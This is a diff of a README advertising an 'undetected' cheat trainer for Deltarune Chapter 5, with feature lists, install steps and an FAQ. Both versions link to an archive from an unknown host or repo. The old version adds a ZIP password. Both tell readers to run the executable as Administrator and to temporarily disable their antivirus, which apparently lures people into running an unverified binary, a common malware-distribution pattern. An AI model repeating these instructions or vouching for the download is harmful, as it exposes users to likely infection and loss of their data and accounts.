@@ -1,50 +1,75 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# 🎮 Deltarune-Chapter5-Trainer-Undetected - Explore the game with total control
 
-![Version](https://img.shields.io/badge/version-1.0.2-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected)
 
-## 🚀 Features
+## 📌 About this trainer
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+This tool helps players explore Deltarune Chapter 5 without limits. It works as an external application. It monitors the game memory to apply changes to stats and inventory. You do not need to modify game files. The tool keeps your save data safe while you experiment with game mechanics.
 
-## 📥 Download & Installation
+## ⚙️ Features
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+This application includes several options for your gameplay.
 
-## 💻 Compatibility
+* Infinite Health: Keep your HP stable during boss fights.
+* Max Stats: Set your attack and defense values to the highest level.
+* Unlimited Items: Carry as many supplies as you need.
+* Speed Control: Change the game pace to move faster or slower.
+* External Design: The tool runs separate from the game process to stay undetected.
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+## 🖥️ System Requirements
 
-## 🔧 Troubleshooting
+Ensure your computer meets these standards before you run the trainer.
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+* Operating System: Windows 10 or Windows 11.
+* Game Version: The latest release of Deltarune Chapter 5.
+* Permissions: You need administrator access to allow the tool to read game memory.
+* Framework: The system requires the latest .NET Desktop Runtime. 
 
-## 📄 License
+## 📥 Getting the trainer
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the project page to download the latest version: [https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected](https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected)
+2. Locate the download button on the page.
+3. Save the file to your desktop or a folder you can find.
+4. Extract the contents if the file arrives as a zip archive.
+5. Right-click the file and choose Run as Administrator.
 
-`bullet-hell` `windows` `rpg-trainer` `deltarune` `game-tool` `undetected` `deltarune-chapter-5` `mod-menu` `chapter-5` `trainer` `unlimited-items` `single-player` `steam` `toby-fox` `game-trainer`
+## 🚀 How to use
+
+Run the trainer after you launch the game. Follow this order to ensure everything works as intended.
+
+1. Open Deltarune Chapter 5.
+2. Load your save file or start a new game.
+3. Alt-Tab to your desktop.
+4. Open the trainer application.
+5. Select the features you want to enable. 
+6. Return to your game window.
+7. Use the assigned hotkeys to toggle features on or off during play.
+
+## 🛡️ Safety and Troubleshooting
+
+This tool reads game information to offer its functions. It does not write data back to the game files, which keeps your save data secure. If you experience issues, review these common fixes.
+
+* If the trainer fails to detect the game, make sure both are running with administrator privileges.
+* Disable your antivirus temporarily if it flags the tool. Some security software prevents external apps from reading game memory.
+* Verify that you have the correct version of the trainer for your game build.
+* Restart your computer if the hotkeys do not respond inside the game.
+* The tool works best in Windowed or Borderless Windowed mode. Switch your game display settings if the features do not apply.
+
+## ❓ Frequently Asked Questions
+
+Will this break my game?
+No. The trainer only changes temporary memory values. When you close the game and the trainer, the game returns to its normal state.
+
+Can I get banned for using this?
+This is a single-player game. There are no online components to monitor your stats. Using this tool for exploration carries no risk of account penalties.
+
+Do I need to install anything else?
+The tool requires the .NET Desktop Runtime. If the app does not open, search for the official Microsoft .NET download page and install the runtime compatible with your Windows version.
+
+Can I customize the hotkeys?
+Open the settings menu inside the trainer. You can assign any key to the available functions. Save your profile so the trainer remembers your layout next time you open the program.
+
+Why does the screen flicker when I change speed?
+The speed control modifies the game loop. Some visual effects may look different when you increase the frame rate or game speed. This is normal behavior for this type of modification.
